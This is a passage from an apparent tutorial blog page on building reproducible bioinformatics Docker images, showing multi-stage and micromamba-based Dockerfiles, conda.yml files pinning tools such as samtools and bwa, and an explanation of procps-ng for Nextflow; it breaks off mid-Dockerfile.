<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> ubuntu:24.04 </span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">AS</span><span class="token instruction"> builder</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> apt-get update &amp;&amp; apt-get install -y build-essential wget</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> wget https://github.com/samtools/samtools/releases/download/1.18/samtools-1.18.tar.bz2 &amp;&amp; </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    tar -xjf samtools-1.18.tar.bz2 &amp;&amp; </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    cd samtools-1.18 &amp;&amp; </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    ./configure --prefix=/usr/local &amp;&amp; make &amp;&amp; make install</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> ubuntu:24.04</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> apt-get update &amp;&amp; apt-get install -y --no-install-recommends libbz2-1.0 liblzma5 zlib1g</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">COPY</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--from</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">builder</span><span class="token instruction"> /usr/local/bin/samtools /usr/local/bin/</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/bin/bash"</span><span class="token instruction">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="further-optimizations">Further Optimizations<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#further-optimizations" class="hash-link" aria-label="Direct link to Further Optimizations" title="Direct link to Further Optimizations" translate="no">​</a></h3>
<ul>
<li class="">Sort package lists alphabetically</li>
<li class="">Use <code>.dockerignore</code> to reduce build context size</li>
<li class="">Pin exact tool/package versions for reproducibility</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-building-docker-images-with-conda-and-micromamba">4. Building Docker Images with Conda and Micromamba<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#4-building-docker-images-with-conda-and-micromamba" class="hash-link" aria-label="Direct link to 4. Building Docker Images with Conda and Micromamba" title="Direct link to 4. Building Docker Images with Conda and Micromamba" translate="no">​</a></h2>
<p>Building Docker containers from Conda packages is one of the most efficient ways to create reproducible bioinformatics environments. Micromamba is a lightweight, faster alternative to Conda that's perfect for containers.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-micromamba-for-docker-images">Why Micromamba for Docker Images?<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#why-micromamba-for-docker-images" class="hash-link" aria-label="Direct link to Why Micromamba for Docker Images?" title="Direct link to Why Micromamba for Docker Images?" translate="no">​</a></h3>
<p>Micromamba offers significant advantages over traditional Conda:</p>
<ul>
<li class=""><strong>Fast:</strong> 10-100x faster dependency resolution than Conda</li>
<li class=""><strong>Lightweight:</strong> Minimal footprint, perfect for containerized deployments</li>
<li class=""><strong>Reproducible:</strong> Environment lock files guarantee exact versions</li>
<li class=""><strong>Production-ready:</strong> Used extensively in bioinformatics pipelines</li>
<li class=""><strong>Small base image:</strong> Official <code>mambaorg/micromamba</code> image is only ~150MB</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-modern-approach-condayml--micromamba">The Modern Approach: Conda.yml + Micromamba<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#the-modern-approach-condayml--micromamba" class="hash-link" aria-label="Direct link to The Modern Approach: Conda.yml + Micromamba" title="Direct link to The Modern Approach: Conda.yml + Micromamba" translate="no">​</a></h3>
<p>Instead of writing complex RUN commands with inline package specifications, use a <code>conda.yml</code> environment file:</p>
<p><strong>conda.yml:</strong></p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> base</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">channels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">dependencies</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">fastqc=0.12.1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">samtools=1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">bwa=0.7.17</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">procps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">ng</span><br></span></code></pre></div></div>
<p><strong>Dockerfile:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> mambaorg/micromamba:1.5.10-noble</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Copy environment file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">COPY</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--chown</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">$MAMBA_USER:$MAMBA_USER</span><span class="token instruction"> conda.yml /tmp/conda.yml</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install packages from environment file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> micromamba install -y -n base -f /tmp/conda.yml </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; micromamba clean -a -y</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Export explicit lock file for reproducibility</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> micromamba env export --name base --explicit &gt; environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&gt;&gt; CONDA_LOCK_START"</span><span class="token instruction"> </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; cat environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&lt;&lt; CONDA_LOCK_END"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Set PATH</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">USER</span><span class="token instruction"> root</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ENV</span><span class="token instruction"> PATH=</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"$MAMBA_ROOT_PREFIX/bin:$PATH"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/bin/bash"</span><span class="token instruction">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-the-dockerfile">Understanding the Dockerfile<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#understanding-the-dockerfile" class="hash-link" aria-label="Direct link to Understanding the Dockerfile" title="Direct link to Understanding the Dockerfile" translate="no">​</a></h3>
<p>Let's break down each component:</p>
<p><strong>1. Base Image:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> mambaorg/micromamba:1.5.10-noble</span><br></span></code></pre></div></div>
<ul>
<li class=""><code>mambaorg/micromamba</code> includes Micromamba pre-installed</li>
<li class=""><code>1.5.10</code> is the version (pin for reproducibility)</li>
<li class=""><code>noble</code> is Ubuntu 24.04 LTS variant</li>
<li class="">Much lighter than installing Conda from scratch</li>
</ul>
<p><strong>2. Copy Environment File:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">COPY</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--chown</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">$MAMBA_USER:$MAMBA_USER</span><span class="token instruction"> conda.yml /tmp/conda.yml</span><br></span></code></pre></div></div>
<ul>
<li class="">Copies your conda.yml to the container</li>
<li class=""><code>$MAMBA_USER</code> is the non-root user (set by base image)</li>
<li class="">Preserves proper file ownership</li>
</ul>
<p><strong>3. Install with Micromamba:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> micromamba install -y -n base -f /tmp/conda.yml </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; micromamba clean -a -y</span><br></span></code></pre></div></div>
<ul>
<li class=""><code>-y</code>: Auto-confirm installation</li>
<li class=""><code>-n base</code>: Install into the base environment</li>
<li class=""><code>-f /tmp/conda.yml</code>: Use environment file</li>
<li class=""><code>micromamba clean -a -y</code>: Remove cached packages (reduces image size by ~50%)</li>
</ul>
<p><strong>4. Generate Lock File (for reproducibility):</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> micromamba env export --name base --explicit &gt; environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&gt;&gt; CONDA_LOCK_START"</span><span class="token instruction"> </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; cat environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&lt;&lt; CONDA_LOCK_END"</span><br></span></code></pre></div></div>
<ul>
<li class="">Exports explicit lock file with exact pinned versions and URLs</li>
<li class="">Echo statements make lock file visible in build logs</li>
<li class="">This file can be saved and used for exact reproducibility later</li>
</ul>
<p><strong>5. Set PATH and User:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">USER</span><span class="token instruction"> root</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ENV</span><span class="token instruction"> PATH=</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"$MAMBA_ROOT_PREFIX/bin:$PATH"</span><br></span></code></pre></div></div>
<ul>
<li class="">Ensures Micromamba binaries are in PATH</li>
<li class=""><code>USER root</code> required for some system monitoring (see procps-ng below)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-procps-ng-is-important-for-nextflow">Why procps-ng is Important for Nextflow<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#why-procps-ng-is-important-for-nextflow" class="hash-link" aria-label="Direct link to Why procps-ng is Important for Nextflow" title="Direct link to Why procps-ng is Important for Nextflow" translate="no">​</a></h3>
<p>Notice <code>conda-forge::procps-ng</code> in the dependencies. Here's why:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">dependencies</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">procps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">ng</span><br></span></code></pre></div></div>
<p>Nextflow uses <code>procps-ng</code> tools (like <code>ps</code>, <code>top</code>) to monitor:</p>
<ul>
<li class="">CPU usage</li>
<li class="">Memory consumption</li>
<li class="">Process status</li>
</ul>
<p>Without it, Nextflow cannot properly track task resource usage. Always include it in bioinformatics containers.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="complete-multi-tool-example">Complete Multi-Tool Example<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#complete-multi-tool-example" class="hash-link" aria-label="Direct link to Complete Multi-Tool Example" title="Direct link to Complete Multi-Tool Example" translate="no">​</a></h3>
<p>Here's a full example with multiple bioinformatics tools:</p>
<p><strong>conda.yml:</strong></p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> base</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">channels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">dependencies</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">fastqc=0.12.1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">samtools=1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">bwa=0.7.17</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">bcftools=1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">picard=3.0.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">procps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">ng</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">parallel</span><br></span></code></pre></div></div>
<p><strong>Dockerfile:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> mambaorg/micromamba:1.5.10-noble</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">COPY</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--chown</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">$MAMBA_USER:$MAMBA_USER</span><span class="token instruction"> conda.yml /tmp/conda.yml</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> micromamba install -y -n base -f /tmp/conda.yml </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; micromamba install -y -n base conda-forge::procps-ng </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; micromamba env export --name base --explicit &gt; environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&gt;&gt; CONDA_LOCK_START"</span><span class="token instruction"> </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; cat environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&lt;&lt; CONDA_LOCK_END"</span><span class="token instruction"> </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; micromamba clean -a -y</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">USER</span><span class="token instruction"> 